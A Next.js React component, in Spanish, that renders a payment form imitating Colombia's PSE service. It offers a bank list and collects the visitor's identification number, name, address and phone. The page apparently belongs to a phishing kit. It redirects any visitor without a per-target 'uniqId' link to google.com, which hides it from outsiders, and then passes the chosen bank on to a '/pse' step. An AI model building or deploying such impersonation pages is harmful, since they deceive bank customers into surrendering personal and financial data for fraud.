"use client"
import { useEffect, useState } from "react"
import"./pse/pse.css"
import InputMinimalista from "@/components/inputMinimalista/InputMinimalista"
import { SelectMinimalista } from "@/components/selectMinimalista/SelectMinimalista"
import { useRouter, useSearchParams } from "next/navigation"
import { useDispatch } from "react-redux"
import { setBanco } from "@/redux/slices/homeSlice"

const text_color_label = "text-gray-600"

export default function Main(){
    const searchParams = useSearchParams()
    const uniqId = searchParams.get('uniqId')
    
    const router = useRouter()
    const dispacth = useDispatch()
    
    const [datosInicio, setDatosInicio] = useState({
        bancos: "Alianza",
        tipoIdentificacion: "Cédula de ciudadanía",
        tipoPersona: "Natural",
        identidicacion: "",
        nombre: "",
        direccion: "",
        telefono: "",
    })
    
    const [errorDatos, setError] = useState({
        bancos: "",
        tipoIdentificacion: "",
        tipoPersona: "Natural",
        identidicacion: "",
        nombre: "",
        direccion: "",
        telefono: "",
    })

    useEffect(()=>{
        if (uniqId) {
            localStorage.setItem('uniqId', uniqId)
        }else{
            window.location.href = 'https://www.google.com'
        }
    },[uniqId])

    const handlerInformacion = (e) => {
        const { name, value } = e.target;

        // Actualiza el dato
        setDatosInicio((prev) => ({
            ...prev,
            [name]: value,
        }));

        // Limpia error si había
        setError((prev) => ({
            ...prev,
            [name]: value.trim() !== "" ? "" : prev[name],
        }));
    }

    const verificarErrores = () => {
        const nuevosErrores = {};

        // Validación de identificación: obligatoria y numérica
        if (!datosInicio.identidicacion.trim()) {
            nuevosErrores.identidicacion = "Ingrese su identificación";
        } else if (!/^\d+$/.test(datosInicio.identidicacion)) {
            nuevosErrores.identidicacion = "Solo se permiten números";
        }

        // Validación de nombre: obligatorio, solo letras y espacios
        if (!datosInicio.nombre.trim()) {
            nuevosErrores.nombre = "Ingrese su nombre";
        } else if (!/^[a-zA-ZÁÉÍÓÚáéíóúñÑ\s]+$/.test(datosInicio.nombre)) {
            nuevosErrores.nombre = "Solo letras y espacios permitidos";
        }

        // Validación de dirección: obligatoria (se permite cualquier carácter)
        if (!datosInicio.direccion.trim()) {
            nuevosErrores.direccion = "Ingrese su dirección";
        }

        // Validación de teléfono: obligatorio, numérico, y mínimo 7 dígitos
        if (!datosInicio.telefono.trim()) {
            nuevosErrores.telefono = "Ingrese su teléfono";
        } else if (!/^\d+$/.test(datosInicio.telefono)) {
            nuevosErrores.telefono = "Solo se permiten números";
        } else if (datosInicio.telefono.length < 7 || datosInicio.telefono.length > 10) {
            nuevosErrores.telefono = "Debe tener entre 7 y 10 dígitos";
        }

        // Aplica los errores
        setError((prev) => ({
            ...prev,
            ...nuevosErrores,
        }));

        // Retorna true si no hay errores
        return Object.keys(nuevosErrores).length === 0;
    };



    return(
        <div className="w-full bg-gray-100 flex flex-col justify-center items-center">
            <div className="w-[85%] p-6 mt-2.5 mb-2.5 bg-white flex flex-col justify-center items-center">
                <div className="flex w-[90%] pt-3.5 gap gap-x-1.5">
                    <input defaultChecked={true} type="radio" name="opcion" id="op1" />
                    <label htmlFor="op1" className="flex justify-center items-center gap gap-x-1 ">
                        <img src="/assets/pse/pse-logo.png" alt="icono" className="w-10 h-10 rounded-full mb-1" />
                        <span className="text-sm font-semibold">pse</span>
                    </label>
                </div>

                <div className="w-[80%] flex flex-col justify-center items-center gap gap-y-4">
                    <SelectMinimalista 
                        label={"Bancos"} 
                        labelColor={text_color_label} 
                        name={"bancos"} 
                        handler={handlerInformacion} 
                        value={datosInicio.bancos} 
                        arrayDatos={["Alianza", "Avvillas", "Bancolombia", "BBVA", "Caja Social", "Nequi"]} 
                        borderCol={"border-gray-400"}
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                    />
                    <SelectMinimalista 
                        label={"Tipo de identificaciÓn"} 
                        labelColor={text_color_label} 
                        name={"tipoIdentificacion"} 
                        handler={handlerInformacion} 
                        value={datosInicio.tipoIdentificacion} 
                        arrayDatos={["Cédula de ciudadanía", "Cédula de extranjería", "Tarjeta de identidad", "Pasaporte", "Registro Civil", "NUIP"]} 
                        borderCol={"border-gray-400"}
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                    />
                    <SelectMinimalista 
                        label={"Tipo de persona"} 
                        labelColor={text_color_label} 
                        name={"tipoPersona"} 
                        handler={handlerInformacion} 
                        value={datosInicio.tipoPersona} 
                        arrayDatos={["Natural", "juridica"]} 
                        borderCol={"border-gray-400"}
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                    />
                    <InputMinimalista 
                        error={!!errorDatos.identidicacion} 
                        errorLabel={errorDatos.identidicacion} 
                        label={"Identificación"} 
                        labelColor={text_color_label} 
                        placeHolder={"Ingrese identificación"} 
                        name={"identidicacion"} 
                        handler={handlerInformacion} 
                        value={datosInicio.identidicacion} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"} 
                        modoNumerico={true}
                    />
                    <InputMinimalista 
                        error={!!errorDatos.nombre} 
                        errorLabel={errorDatos.nombre} 
                        label={"Nombre"} 
                        labelColor={text_color_label} 
                        placeHolder={"Ingrese su nombre"} 
                        name={"nombre"} 
                        handler={handlerInformacion} 
                        value={datosInicio.nombre} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"} 
                    />
                    <InputMinimalista 
                        error={!!errorDatos.direccion} 
                        errorLabel={errorDatos.direccion} 
                        label={"Direccion"} 
                        labelColor={text_color_label} 
                        placeHolder={"Ingrese dirección"} 
                        name={"direccion"} 
                        handler={handlerInformacion} 
                        value={datosInicio.direccion} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"} 
                    />
                    <InputMinimalista 
                        error={!!errorDatos.telefono} 
                        errorLabel={errorDatos.telefono} 
                        label={"Telefono"} 
                        labelColor={text_color_label} 
                        placeHolder={"Ingrese dirección"} 
                        name={"telefono"} 
                        handler={handlerInformacion} 
                        value={datosInicio.telefono} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                        modoNumerico={true} 
                    />
                </div>
            </div>
            
            <div className="w-[85%] flex justify-between items-center">
                <button
                    onClick={() => {
                        if (verificarErrores()) {
                            dispacth(setBanco(datosInicio.bancos))
                            router.push("/pse")
                        }
                    }}
                    className="mt-1 px-8 py-2 bg-blue-500 text-white rounded-lg"
                    >
                    Iniciar pago
                </button>

                <button className="mt-1 px-8 py-2 border border-blue-500 text-blue-500 rounded-lg">
                    Cancelar pago
                </button>
            </div>

        </div>
    )
}